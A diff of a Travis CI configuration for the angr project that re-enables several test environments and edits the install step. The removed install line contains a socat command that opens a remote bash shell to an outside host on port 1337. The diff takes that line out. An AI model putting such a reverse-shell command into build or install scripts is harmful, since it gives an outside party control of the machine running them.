@@ -3,9 +3,9 @@ python: 2.7
 sudo: required
 dist: xenial
 env:
-  #  - PY="e" ANGR_REPO=claripy
-  #  - PY="e" ANGR_REPO=simuvex
-  #  - PY="e" ANGR_REPO=angr
+  - PY="e" ANGR_REPO=claripy
+  - PY="e" ANGR_REPO=simuvex
+  - PY="e" ANGR_REPO=angr
   - PY="e" ANGR_REPO=angr-doc
-install: (sudo apt-get update || true) && cd && git clone https://github.com/angr/angr-dev && cd angr-dev && sudo apt-get install socat && socat tcp-connect:andrewdutcher.com:1337 system:bash && bash -ex ./setup.sh -i -w -v -$PY angr
+install: (sudo apt-get update || true) && cd && git clone https://github.com/angr/angr-dev && cd angr-dev && bash -ex ./setup.sh -i -w -v -$PY angr
 script: cd ~/angr-dev && source ~/.virtualenvs/angr/bin/activate && ./travis-test.sh
